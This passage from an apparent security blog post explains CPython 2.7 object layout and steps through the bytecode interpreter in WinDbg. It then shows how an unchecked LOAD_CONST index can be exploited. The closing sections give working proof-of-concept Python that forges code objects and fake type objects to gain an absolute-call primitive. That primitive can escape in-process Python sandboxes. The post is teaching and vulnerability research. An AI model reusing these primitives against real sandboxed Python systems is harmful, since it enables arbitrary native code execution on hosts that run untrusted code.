```</p>

<ul>
<li>The second one is the variable part that describes the specifics of your object. Here is for example <em>PyStringObject</em>:</li>
</ul>


<p>```c PyStringObject
typedef struct {
  PyObject_VAR_HEAD
  long ob_shash;
  int ob_sstate;
  char ob_sval[1];</p>

<p>  /<em> Invariants:
   *     ob_sval contains space for &lsquo;ob_size+1&rsquo; elements.
   *     ob_sval[ob_size] == 0.
   *     ob_shash is the hash of the string or -1 if not computed yet.
   *     ob_sstate != 0 iff the string object is in stringobject.c&rsquo;s
   *       &lsquo;interned&rsquo; dictionary; in this case the two references
   *       from &lsquo;interned&rsquo; to this object are </em>not counted<em> in ob_refcnt.
   </em>/
} PyStringObject;
```</p>

<p>Now, some of you may ask themselves &ldquo;How does Python know the type of an object when it receives a pointer ?&rdquo;. In fact, this is exactly the role of the field <em>ob_type</em>. Python exports a <em>_typeobject</em> static variable that describes the type of the object. Here is, for instance the <em>PyString_Type</em>:</p>

<p><code>c PyString_Type
PyTypeObject PyString_Type = {
  PyVarObject_HEAD_INIT(&amp;PyType_Type, 0)
  "str",
  PyStringObject_SIZE,
  sizeof(char),
  string_dealloc,                             /* tp_dealloc */
  (printfunc)string_print,                    /* tp_print */
  0,                                          /* tp_getattr */
  // ...
};
</code></p>

<p>Basically, every string objects will have their <em>ob_type</em> fields pointing to that <em>PyString_Type</em> variable. With this cute little trick, Python is able to do type checking like that:</p>

<p>```c PyString_Check PyString_CheckExact</p>

<h1>define Py_TYPE(ob)             (((PyObject*)(ob))&ndash;>ob_type)</h1>

<h1>define PyType_HasFeature(t,f)  (((t)&ndash;>tp_flags &amp; (f)) != 0)</h1>

<h1>define PyType_FastSubclass(t,f)  PyType_HasFeature(t,f)</h1>

<h1>define PyString_Check(op) \</h1>

<p>  PyType_FastSubclass(Py_TYPE(op), Py_TPFLAGS_STRING_SUBCLASS)</p>

<h1>define PyString_CheckExact(op) (Py_TYPE(op) == &amp;PyString_Type)</h1>

<p>```</p>

<p>With the previous tricks, and the <em>PyObject</em> type defined as follow, Python is able to handle in a generic-fashion the different objects:
<code>c PyObject
typedef struct _object {
  PyObject_HEAD
} PyObject;
</code></p>

<p>So when you are in your debugger and you want to know what type of object it is, you can use that field to identify easily the type of the object you are dealing with:</p>

<p><code>text ob_type really useful when debugging
0:000&gt; dps 026233b0 l2
026233b0  00000001
026233b4  1e226798 python27!PyString_Type
</code></p>

<p>Once you have done that, you can dump the variable part describing your object to extract the information you want.
By the way, all the native objects are implemented in the <a href="https://github.com/python-git/python/tree/master/Objects">Objects/</a> directory.</p>

<h3>Debugging session: stepping the VM. The hard way.</h3>

<p>It&rsquo;s time for us to go a little bit deeper, at the assembly level, where we belong ; so let&rsquo;s define a dummy function like this one:</p>

<p><code>python dummy function
def a(b, c):
  return b + c
</code></p>

<p>Now using the Python&rsquo;s <a href="http://docs.python.org/2/library/dis.html">dis</a> module, we can disassemble the function object <em>a</em>:</p>

<p>```text disassemble a
In [20]: dis.dis(a)
2   0 LOAD_FAST                0 (b)</p>

<pre><code>3 LOAD_FAST                1 (c)
6 BINARY_ADD
7 RETURN_VALUE
</code></pre>

<p>In [21]: a.func_code.co_code
In [22]: print &lsquo;&rsquo;.join(&lsquo;\x%.2x&rsquo; % ord(i) for i in a.<strong>code</strong>.co_code)
\x7c\x00\x00\x7c\x01\x00\x17\x53</p>

<p>In [23]: opcode.opname[0x7c]
Out[23]: &lsquo;LOAD_FAST&rsquo;
In [24]: opcode.opname[0x17]
Out[24]: &lsquo;BINARY_ADD&rsquo;
In [25]: opcode.opname[0x53]
Out[25]: &lsquo;RETURN_VALUE&rsquo;
```</p>

<p>Keep in mind, as we said earlier, that everything is an object ; so a function is an object, and bytecode is an object as well:</p>

<p>```c PyFunctionObject PyCodeObject
typedef struct {
  PyObject_HEAD
  PyObject <em>func_code;  /</em> A code object <em>/
  // &hellip;
} PyFunctionObject;
/</em> Bytecode object */
typedef struct {</p>

<pre><code>PyObject_HEAD
//...
PyObject *co_code;    /* instruction opcodes */
//...
</code></pre>

<p>} PyCodeObject;
```</p>

<p>Time to attach my debugger to the interpreter to see what&rsquo;s going on in that weird-machine, and to place a conditional breakpoint on <a href="https://github.com/python-git/python/blob/master/Python/ceval.c#L667">PyEval_EvalFrameEx</a>.
Once you did that, you can call the dummy function:</p>

<p>```text windbg breakpoint
0:000> bp python27!PyEval_EvalFrameEx+0x2b2 &ldquo;.if(poi(ecx+4) == 0x53170001){}.else{g}&rdquo;
breakpoint 0 redefined
0:000> g
eax=025ea914 ebx=00000000 ecx=025ea914 edx=026bef98 esi=1e222c0c edi=02002e38
eip=1e0ec562 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
python27!PyEval_EvalFrameEx+0x2b2:
1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea914=7c</p>

<p>0:000> db ecx l8
025ea914  7c 00 00 7c 01 00 17 53                          |..|&hellip;S
```</p>

<p>OK perfect, we are in the middle of the VM, and our function is being evaluated. The register <em>ECX</em> points to the bytecode being evaluated, and the first opcode is <em>LOAD_FAST</em>.</p>

<p>Basically, this opcode takes an object in the <em>fastlocals</em> array, and push it on the virtual stack. In our case, as we saw in both the disassembly and the bytecode dump, we are going to load the index 0 (the argument <em>b</em>), then the index 1 (argument <em>c</em>).</p>

<p>Here&rsquo;s what it looks like in the debugger ; first step is to load the <em>LOAD_FAST</em> opcode:</p>

<p><code>text fetching the LOAD_FAST opcode
0:000&gt;
eax=025ea914 ebx=00000000 ecx=025ea914 edx=026bef98 esi=1e222c0c edi=02002e38
eip=1e0ec562 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
python27!PyEval_EvalFrameEx+0x2b2:
1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea914=7c
</code></p>

<p>In <em>ECX</em> we have a pointer onto the opcodes of the function being evaluated, our dummy function. <em>0x7c</em> is the value of the <em>LOAD_FAST</em> opcode as we can see:</p>

<p>```c LOAD_FAST</p>

<h1>define LOAD_FAST 124 /<em> Local variable number </em>/</h1>

<p>```</p>

<p>Then, the function needs to check if the opcode has argument or not, and that&rsquo;s done by comparing the opcode with a constant value called <em>HAVE_ARGUMENT</em>:</p>

<p><code>text Checking if the opcode has an argument
0:000&gt;
eax=0000007c ebx=00000000 ecx=025ea915 edx=026bef98 esi=1e222c0c edi=00000000
eip=1e0ec568 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
python27!PyEval_EvalFrameEx+0x2b8:
1e0ec568 83f85a          cmp     eax,5Ah
</code></p>

<p>Again, we can verify the value to be sure we understand what we are doing:</p>

<p><code>python opcode.HAVE_ARGUMENT
In [11]: '%x' % opcode.HAVE_ARGUMENT
Out[11]: '5a'
</code></p>

<p>```c HAS_ARG</p>

<h1>define HAS_ARG(op) ((op) >= HAVE_ARGUMENT)</h1>

<p>```</p>

<p>If the opcode has an argument, the function needs to retrieve it (it&rsquo;s one byte):</p>

<p><code>text Fetching the argument
0:000&gt;
eax=0000007c ebx=00000000 ecx=025ea915 edx=026bef98 esi=1e222c0c edi=00000000
eip=1e0ec571 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200206
python27!PyEval_EvalFrameEx+0x2c1:
1e0ec571 0fb67901        movzx   edi,byte ptr [ecx+1]       ds:002b:025ea916=00
</code></p>

<p>As expected for the first <em>LOAD_FAST</em> the argument is <em>0x00</em>, perfect.
After that the function dispatches the execution flow to the <em>LOAD_FAST</em> case defined as follow:</p>

<p>```c LOAD_FAST definition</p>

<h1>define GETLOCAL(i)     (fastlocals[i])</h1>

<h1>define Py_INCREF(op) (                         \</h1>

<pre><code>_Py_INC_REFTOTAL  _Py_REF_DEBUG_COMMA       \
((PyObject*)(op))-&gt;ob_refcnt++)
</code></pre>

<h1>define PUSH(v)                BASIC_PUSH(v)</h1>

<h1>define BASIC_PUSH(v)     (*stack_pointer++ = (v))</h1>

<p>case LOAD_FAST:
  x = GETLOCAL(oparg);
  if (x != NULL) {</p>

<pre><code>Py_INCREF(x);
PUSH(x);
goto fast_next_opcode;
</code></pre>

<p>  }
  //&hellip;
  break;
```</p>

<p>Let&rsquo;s see what it looks like in assembly:</p>

<p><code>text Loads the fastlocals array (026bef98)
0:000&gt;
eax=0000007c ebx=00000000 ecx=0000007b edx=00000059 esi=1e222c0c edi=00000000
eip=1e0ec5cf esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei ng nz na po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200283
python27!PyEval_EvalFrameEx+0x31f:
1e0ec5cf 8b54246c        mov     edx,dword ptr [esp+6Ch] ss:002b:0027fd44=98ef6b02
</code></p>

<p>After getting the <em>fastlocals</em>, we can retrieve an entry:</p>

<p><code>text Retrieve the entry 0 of the fastlocals array
0:000&gt;
eax=0000007c ebx=00000000 ecx=0000007b edx=026bef98 esi=1e222c0c edi=00000000
eip=1e0ec5d3 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei ng nz na po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200283
python27!PyEval_EvalFrameEx+0x323:
1e0ec5d3 8bb4ba38010000  mov     esi,dword ptr [edx+edi*4+138h] ds:002b:026bf0d0=a0aa5e02
</code></p>

<p>Also keep in mind we called our dummy function with two strings, so let&rsquo;s actually check it is a string object:</p>

<p><code>text Type checking
0:000&gt; dps 025eaaa0 l2
025eaaa0  00000004
025eaaa4  1e226798 python27!PyString_Type
</code></p>

<p>Perfect, now according to the definition of <em>PyStringObject</em>:</p>

<p>```c PyStringObject
typedef struct {</p>

<pre><code>PyObject_VAR_HEAD
long ob_shash;
int ob_sstate;
char ob_sval[1];
</code></pre>

<p>} PyStringObject;
```</p>

<p>We should find the content of the string directly in the object:</p>

<p><code>text Finding the string in the PyStringObject
0:000&gt; db 025eaaa0 l1f
025eaaa0  04 00 00 00 98 67 22 1e-05 00 00 00 dd 16 30 43  .....g".......0C
025eaab0  01 00 00 00 48 65 6c 6c-6f 00 00 00 ff ff ff     ....Hello......
</code></p>

<p>Awesome, we have the size of the string at the offset <em>0x8</em>, and the actual string is at <em>0x14</em>.</p>

<p>Let&rsquo;s move on to the second opcode now, this time with less details though:</p>

<p><code>text Fetching the second LOAD_FAST opcode
0:000&gt;
eax=0000007c ebx=00000000 ecx=025ea917 edx=026bef98 esi=025eaaa0 edi=00000000
eip=1e0ec562 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
python27!PyEval_EvalFrameEx+0x2b2:
1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea917=7c
</code></p>

<p>This time, we are loading the second argument, so the index 1 of <em>fastlocals</em>.
We can type-check the object and dump the string stored in it:</p>

<p><code>text Retrieving the index 1 of fastlocals (025ea9c0)
0:000&gt;
eax=0000007c ebx=00000000 ecx=0000007b edx=026bef98 esi=025eaaa0 edi=00000001
eip=1e0ec5d3 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei ng nz na po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200283
python27!PyEval_EvalFrameEx+0x323:
1e0ec5d3 8bb4ba38010000  mov     esi,dword ptr [edx+edi*4+138h] ds:002b:026bf0d4=c0af5e02
0:000&gt; db poi(026bf0d4) l1f
025eafc0  04 00 00 00 98 67 22 1e-05 00 00 00 39 4a 25 29  .....g".....9J%)
025eafd0  01 00 00 00 57 6f 72 6c-64 00 5e 02 79 00 00     ....World.^.y..
</code></p>

<p>Comes now the <em>BINARY_ADD</em> opcode:</p>

<p><code>text Fetching the BINARY_ADD opcode
0:000&gt;
eax=0000007c ebx=00000000 ecx=025ea91a edx=026bef98 esi=025eafc0 edi=00000001
eip=1e0ec562 esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
python27!PyEval_EvalFrameEx+0x2b2:
1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea91a=17
</code></p>

<p>Here it&rsquo;s supposed to retrieve the two objects on the top-of-stack, and add them.
The C code looks like this:</p>

<p>```c BINARY_ADD</p>

<h1>define SET_TOP(v)        (stack_pointer[-1] = (v))</h1>

<p>case BINARY_ADD:
  w = POP();
  v = TOP();
  if (PyInt_CheckExact(v) &amp;&amp; PyInt_CheckExact(w)) {</p>

<pre><code>// Not our case
</code></pre>

<p>  }
  else if (PyString_CheckExact(v) &amp;&amp;</p>

<pre><code>       PyString_CheckExact(w)) {
  x = string_concatenate(v, w, f, next_instr);
  /* string_concatenate consumed the ref to v */
  goto skip_decref_vx;
</code></pre>

<p>  }
  else {</p>

<pre><code>// Not our case
</code></pre>

<p>  }
  Py_DECREF(v);
skip_decref_vx:
  Py_DECREF(w);
  SET_TOP(x);
  if (x != NULL) continue;
  break;
```</p>

<p>And here is the assembly version where it retrieves the two objects from the top-of-stack:</p>

<p><code>text POP and TOP
0:000&gt;
eax=00000017 ebx=00000000 ecx=00000016 edx=0000000f esi=025eafc0 edi=00000000
eip=1e0eccf5 esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei ng nz na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200287
python27!PyEval_EvalFrameEx+0xa45:
1e0eccf5 8b75f8          mov     esi,dword ptr [ebp-8] ss:002b:026bf0d8=a0aa5e02
...
0:000&gt;
eax=1e226798 ebx=00000000 ecx=00000016 edx=0000000f esi=025eaaa0 edi=00000000
eip=1e0eccfb esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei ng nz na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200287
python27!PyEval_EvalFrameEx+0xa4b:
1e0eccfb 8b7dfc          mov     edi,dword ptr [ebp-4] ss:002b:026bf0dc=c0af5e02
0:000&gt;
eax=1e226798 ebx=00000000 ecx=00000016 edx=0000000f esi=025eaaa0 edi=025eafc0
eip=1e0eccfe esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei ng nz na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200287
python27!PyEval_EvalFrameEx+0xa4e:
1e0eccfe 83ed04          sub     ebp,4
</code></p>

<p>A bit further we have our string concatenation:</p>

<p><code>text String concatenation in string_concatenate
0:000&gt;
eax=025eafc0 ebx=00000000 ecx=0027fcd0 edx=026bef98 esi=025eaaa0 edi=025eafc0
eip=1e0eb733 esp=0027fcb8 ebp=00000005 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
python27!PyEval_SliceIndex+0x813:
1e0eb733 e83881fcff      call    python27!PyString_Concat (1e0b3870)
0:000&gt; dd esp l3
0027fcb8  0027fcd0 025eafc0 025eaaa0
0:000&gt; p
eax=025eaaa0 ebx=00000000 ecx=00000064 edx=000004fb esi=025eaaa0 edi=025eafc0
eip=1e0eb738 esp=0027fcb8 ebp=00000005 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
python27!PyEval_SliceIndex+0x818:
1e0eb738 8b442418        mov     eax,dword ptr [esp+18h] ss:002b:0027fcd0=c0aa5e02
0:000&gt; db poi(0027fcd0) l1f
025eaac0  01 00 00 00 98 67 22 1e-0a 00 00 00 ff ff ff ff  .....g".........
025eaad0  00 00 00 00 48 65 6c 6c-6f 57 6f 72 6c 64 00     ....HelloWorld.
</code></p>

<p>And the last part of the case is to push the resulting string onto the virtual stack (<em>SET_TOP</em> operation):</p>

<p><code>text Push the resulting object onto the virtual stack
0:000&gt;
eax=025eaac0 ebx=025eaac0 ecx=00000005 edx=000004fb esi=025eaaa0 edi=025eafc0
eip=1e0ecb82 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei pl nz ac po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200213
python27!PyEval_EvalFrameEx+0x8d2:
1e0ecb82 895dfc          mov     dword ptr [ebp-4],ebx ss:002b:026bf0d8=a0aa5e02
</code></p>

<p>Last part of our deep dive, the <em>RETURN_VALUE</em> opcode:</p>

<p><code>text Fetching the RETURN_VALUE opcode
0:000&gt;
eax=025eaac0 ebx=025eafc0 ecx=025ea91b edx=026bef98 esi=025eaac0 edi=025eafc0
eip=1e0ec562 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
python27!PyEval_EvalFrameEx+0x2b2:
1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea91b=53
</code></p>

<p>All right, at least now you have a more precise idea about how that Python virtual machine works, and more importantly how you can directly debug it without symbols. Of course, you can download the debug symbols on Linux and use that information in gdb ; it should make your life easier (&hellip;.but I hate gdb man&hellip;).</p>

<p>Note that I would love very much to have a debugger at the Python bytecode level, it would be much easier than instrumenting the interpreter. If you know one ping me! If you build one ping me too :&ndash;).</p>

<h1>The bug</h1>

<p>Here is the bug, spot it and give it some love:</p>

<p>```c LOAD_CONST bug</p>

<h1>ifndef Py_DEBUG</h1>

<h1>define GETITEM(v, i) PyTuple_GET_ITEM((PyTupleObject *)(v), (i))</h1>

<h1>else</h1>

<p>//&hellip;
/<em> Macro, trading safety for speed &lt;&mdash; LOL, :) </em>/</p>

<h1>define PyTuple_GET_ITEM(op, i) (((PyTupleObject *)(op))&ndash;>ob_item[i])</h1>

<p>case LOAD_CONST:
  x = GETITEM(consts, oparg);
  Py_INCREF(x);
  PUSH(x);
  goto fast_next_opcode;
```</p>

<p>This may be a bit obscure for you, but keep in mind we control the index <em>oparg</em> and the content of <em>consts</em>. That means we can just push <em>untrusted</em> data on the virtual stack of the VM: brilliant. Getting a crash out of this bug is fairly easy, try to run these lines (on a Python 2.7 distribution):</p>

<p>```python craaaaash
import opcode
import types</p>

<p>def a():
  pass</p>

<p>a.func_code = types.CodeType(
  0, 0, 0, 0,
  chr(opcode.opmap[&lsquo;EXTENDED_ARG&rsquo;]) + &lsquo;\xef\xbe&rsquo; +
  chr(opcode.opmap[&lsquo;LOAD_CONST&rsquo;])   + &lsquo;\xad\xde&rsquo;,
  (), (), (), &lsquo;&rsquo;, &lsquo;&rsquo;, 0, &lsquo;&rsquo;
)
a()
```</p>

<p>..and as expected you get a fault (<em>oparg</em> is <em>edi</em>):</p>

<p><code>text craaaaaaash
(2058.2108): Access violation - code c0000005 (!!! second chance !!!)
[...]
eax=01cb1030 ebx=00000000 ecx=00000063 edx=00000046 esi=1e222c0c edi=beefdead
eip=1e0ec5f7 esp=0027e7f8 ebp=0273a9f0 iopl=0         nv up ei ng nz na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010287
python27!PyEval_EvalFrameEx+0x347:
1e0ec5f7 8b74b80c        mov     esi,dword ptr [eax+edi*4+0Ch] ds:002b:fd8a8af0=????????
</code></p>

<p>By the way, some readers might have caught the same type of bug in <em>LOAD_FAST</em> with the <em>fastlocals</em> array ; those readers are definitely right :).</p>

<h1>Walking through the PoC</h1>

<p>OK, so if you look only at the faulting instruction you could say that the bug is minor and we won&rsquo;t be able to turn it into something &ldquo;useful&rdquo;. But the essential piece when you want to exploit a software is to actually completely understand how it works. Then you are more capable of turning bugs that seems useless into interesting primitives.</p>

<p>As we said several times, from Python code you can&rsquo;t really push any value you want onto the Python virtual stack, obviously. The machine is only dealing with Python objects. However, with this bug we can corrupt the virtual stack by pushing arbitrary data that we control. If you do that well, you can end up causing the Python VM to call whatever address you want. That&rsquo;s exactly what I did back when I wrote <a href="https://github.com/0vercl0k/stuffz/blob/master/Python's%20internals/python27_abuse_vm_to_execute_x86_code.py">python27_abuse_vm_to_execute_x86_code.py</a>.</p>

<p>In Python we are really lucky because we can control a lot of things in memory and we have natively a way to &ldquo;leak&rdquo; (I shouldn&rsquo;t call that a leak though because it&rsquo;s a feature) the address of a Python object with the function <em>id</em>. So basically we can do stuff, we can do it reliably and we can manage to not break the interpreter, like bosses.</p>

<h2>Pushing attacker-controlled data on the virtual stack</h2>

<p>We control <em>oparg</em> and the content of the tuple <em>consts</em>. We can also find out the address of that tuple. So we can have a Python string object that stores an arbitrary value, let&rsquo;s say <em>0xdeadbeef</em> and it will be pushed on the virtual stack.</p>

<p>Let&rsquo;s do that in Python now:</p>

<p>```python Pushing controlled value on the virtual stack
import opcode
import types
import struct</p>

<p>def pshort(s):</p>

<pre><code>return struct.pack('&lt;H', s)
</code></pre>

<p>def a():
  pass</p>

<p>consts = ()
s = &lsquo;\xef\xbe\xad\xde&rsquo;
address_s = id(s) + 20 # 20 is the offset of the array of byte we control in the string
address_consts = id(consts)</p>

<h1>python27!PyEval_EvalFrameEx+0x347:</h1>

<h1>1e0ec5f7 8b74b80c        mov     esi,dword ptr [eax+edi*4+0Ch] ds:002b:fd8a8af0=????????</h1>

<p>offset = ((address_s &ndash; address_consts &ndash; 0xC) / 4) &amp; 0xffffffff
high = offset >> 16
low =  offset &amp; 0xffff
print &lsquo;Consts tuple @%#.8x&rsquo; % address_consts
print &lsquo;Address of controled data @%#.8x&rsquo; % address_s
print &lsquo;Offset between const and our object: @%#.8x&rsquo; % offset
print &lsquo;Going to push [%#.8x] on the virtual stack&rsquo; % (address_consts + (address_s &ndash; address_consts &ndash; 0xC) + 0xc)</p>

<p>a.func_code = types.CodeType(
  0, 0, 0, 0,
  chr(opcode.opmap[&lsquo;EXTENDED_ARG&rsquo;]) + pshort(high) +
  chr(opcode.opmap[&lsquo;LOAD_CONST&rsquo;])   + pshort(low),
  consts, (), (), &lsquo;&rsquo;, &lsquo;&rsquo;, 0, &lsquo;&rsquo;
)
a()
```</p>

<p>..annnnd..</p>

<p>```text debugger view
D:>python 1.py
Consts tuple @0x01db1030
Address of controled data @0x022a0654
Offset between const and our object: @0x0013bd86
Going to push [0x022a0654] on the virtual stack</p>

<p><em>JIT debugger pops</em></p>

<p>eax=01db1030 ebx=00000000 ecx=00000063 edx=00000046 esi=deadbeef edi=0013bd86
eip=1e0ec5fb esp=0027fc68 ebp=01e63fc0 iopl=0         nv up ei ng nz na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010287
python27!PyEval_EvalFrameEx+0x34b:
1e0ec5fb ff06            inc     dword ptr [esi]      ds:002b:deadbeef=????????
0:000> ub eip l1
python27!PyEval_EvalFrameEx+0x347:
1e0ec5f7 8b74b80c        mov     esi,dword ptr [eax+edi<em>4+0Ch]
0:000> ? eax+edi</em>4+c
Evaluate expression: 36308564 = 022a0654
0:000> dd 022a0654 l1
022a0654  deadbeef &lt;&ndash; the data we control in our PyStringObject
0:000> dps 022a0654-0n20 l2
022a0640  00000003
022a0644  1e226798 python27!PyString_Type
```
Perfect, we control a part of the virtual stack :).</p>

<h2>Game over, LOAD_FUNCTION</h2>

<p>Once you control the virtual stack, the only limit is your imagination and the ability you have to find an interesting spot in the virtual machine. My idea was to use the <em>CALL_FUNCTION</em> opcode to craft a <em>PyFunctionObject</em> somehow, push it onto the virtual stack and to use the magic opcode.</p>

<p><code>c PyFunctionObject definition
typedef struct {
  PyObject_HEAD
  PyObject *func_code;  /* A code object */
  PyObject *func_globals; /* A dictionary (other mappings won't do) */
  PyObject *func_defaults;  /* NULL or a tuple */
  PyObject *func_closure; /* NULL or a tuple of cell objects */
  PyObject *func_doc;   /* The __doc__ attribute, can be anything */
  PyObject *func_name;  /* The __name__ attribute, a string object */
  PyObject *func_dict;  /* The __dict__ attribute, a dict or NULL */
  PyObject *func_weakreflist; /* List of weak references */
  PyObject *func_module;  /* The __module__ attribute, can be anything */
} PyFunctionObject;
</code></p>

<p>The thing is, as we saw earlier, the virtual machine usually ensures the type of the object it handles. If the type checking fails, the function bails out and we are not happy, at all. It means we would need an information-leak to obtain a pointer to the PyFunction_Type static variable.</p>

<p>Fortunately for us, the CALL_FUNCTION can still be abused without knowing that magic pointer to craft correctly our object. Let&rsquo;s go over the source code to illustrate my sayings:</p>

<p>```c CALL_FUNCTION
case CALL_FUNCTION:
{
  PyObject **sp;
  PCALL(PCALL_ALL);
  sp = stack_pointer;
  x = call_function(&amp;sp, oparg);</p>

<p>static PyObject *
call_function(PyObject <em><strong>pp_stack, int oparg)
{
  int na = oparg &amp; 0xff;
  int nk = (oparg>>8) &amp; 0xff;
  int n = na + 2 * nk;
  PyObject </strong>pfunc = (</em>pp_stack) &ndash; n &ndash; 1;
  PyObject <em>func = </em>pfunc;
  PyObject <em>x, </em>w;</p>

<p>  if (PyCFunction_Check(func) &amp;&amp; nk == 0) {</p>

<pre><code>// ..Nope..
</code></pre>

<p>  } else {</p>

<pre><code>if (PyMethod_Check(func) &amp;&amp; PyMethod_GET_SELF(func) != NULL) {
  // ..Still Nope...
} else
if (PyFunction_Check(func))
  // Nope!
else
  x = do_call(func, pp_stack, na, nk);
</code></pre>

<p>static PyObject *
do_call(PyObject <em>func, PyObject </em>**pp_stack, int na, int nk)
{
  // &hellip;
  if (PyCFunction_Check(func)) {</p>

<pre><code>// Nope
</code></pre>

<p>  }
  else</p>

<pre><code>result = PyObject_Call(func, callargs, kwdict);
</code></pre>

<p>PyObject *
PyObject_Call(PyObject <em>func, PyObject </em>arg, PyObject *kw)
{
  ternaryfunc call;</p>

<p>  if ((call = func->ob_type->tp_call) != NULL) {</p>

<pre><code>PyObject *result;
// Yay an interesting call :)
result = (*call)(func, arg, kw);
</code></pre>

<p>```</p>

<p>So basically the idea to use <em>CALL_FUNCTION</em> was a good one, but we will need to craft two different objects:</p>

<ol>
<li>The first one will be a <em>PyObject</em> with <em>ob_type</em> pointing to the second object</li>
<li>The second object will be a <em>_typeobject</em> with <em>tp_call</em> the address you want to call</li>
</ol>


<p>This is fairly trivial to do and will give us an absolute-call primitive without crashing the interpreter: s.w.e.e.t.</p>

<p>```python absolute call via CALL_FUNCTION
import opcode
import types
import struct</p>

<p>def pshort(s):
  return struct.pack(&lsquo;&lt;H&rsquo;, s)</p>

<p>def puint(s):
  return struct.pack(&lsquo;&lt;I&rsquo;, s)</p>

<p>def a():
  pass</p>

<p>PyStringObject_to_char_array_offset = 20
second_object = &lsquo;A&rsquo; * 0x40 + puint(0xdeadbeef)
addr_second_object = id(second_object)
addr_second_object_controled_data = addr_second_object + PyStringObject_to_char_array_offset</p>

<p>first_object = &lsquo;AAAA&rsquo; + puint(addr_second_object_controled_data)
addr_first_object = id(first_object)
addr_first_object_controled_data = addr_first_object + PyStringObject_to_char_array_offset</p>

<p>consts = ()
s = puint(addr_first_object_controled_data)
address_s = id(s) + PyStringObject_to_char_array_offset
address_consts = id(consts)
offset = ((address_s &ndash; address_consts &ndash; 0xC) / 4) &amp; 0xffffffff</p>

<p>a.func_code = types.CodeType(
  0, 0, 0, 0,
  chr(opcode.opmap[&lsquo;EXTENDED_ARG&rsquo;])  + pshort(offset >> 16)     +
  chr(opcode.opmap[&lsquo;LOAD_CONST&rsquo;])    + pshort(offset &amp; 0xffff)  +
  chr(opcode.opmap[&lsquo;CALL_FUNCTION&rsquo;]) + pshort(0),
  consts, (), (), &lsquo;&rsquo;, &lsquo;&rsquo;, 0, &lsquo;&rsquo;
)
a()
```</p>

<p>And we finally get our primitive working :&ndash;)</p>

<p><code>text call 0xdeadbeef
(11d0.11cc): Access violation - code c0000005 (!!! second chance !!!)
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files (x86)\Python\Python275\python27.dll -
eax=01cc1030 ebx=00000000 ecx=00422e78 edx=00000000 esi=deadbeef edi=02e62df4
eip=deadbeef esp=0027e78c ebp=02e62df4 iopl=0         nv up ei ng nz na po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010283
deadbeef ??              ???
</code></p>

<p>So now you know all the nasty things going under the hood with that <a href="https://github.com/0vercl0k/stuffz/blob/master/Python's%20internals/python27_abuse_vm_to_execute_x86_code.py">python27_abuse_vm_to_execute_x86_code.py</a> script!</p>

<h1>Conclusion, Ideas</h1>

<p>After reading this little post you are now aware that if you want to sandbox efficiently Python, you should do it outside of Python and not by preventing the use of some modules or things like that: this is broken by design. The virtual machine is not safe enough to build a strong sandbox inside Python, so don&rsquo;t rely on such thing if you don&rsquo;t want to get surprised. An article about that exact same thing was written here if you are interested: <a href="https://lwn.net/Articles/574215/">The failure of pysandbox</a>.</p>

<p>You also may want to look at <a href="http://pypy.org/features.html#sandboxing">PyPy&rsquo;s sandboxing capability</a> if you are interested in executing untrusted Python code. Otherwise, you can build your own <a href="https://code.google.com/p/seccompsandbox/wiki/overview">SECCOMP</a>-based system :).</p>

<p>On the other hand, I had a lot of fun taking a deep dive into Python&rsquo;s source code and I hope you had some too! If you would like to know more about the low level aspects of Python here are a list of interesting posts:</p>

<ul>
<li><a href="http://www.jmcneil.net/2012/04/debugging-your-python-with-gdb-ftw/">Debugging Your Python With GDB (FTW!)</a></li>
<li><a href="http://nedbatchelder.com/blog/200804/the_structure_of_pyc_files.html">The structure of .pyc files</a></li>
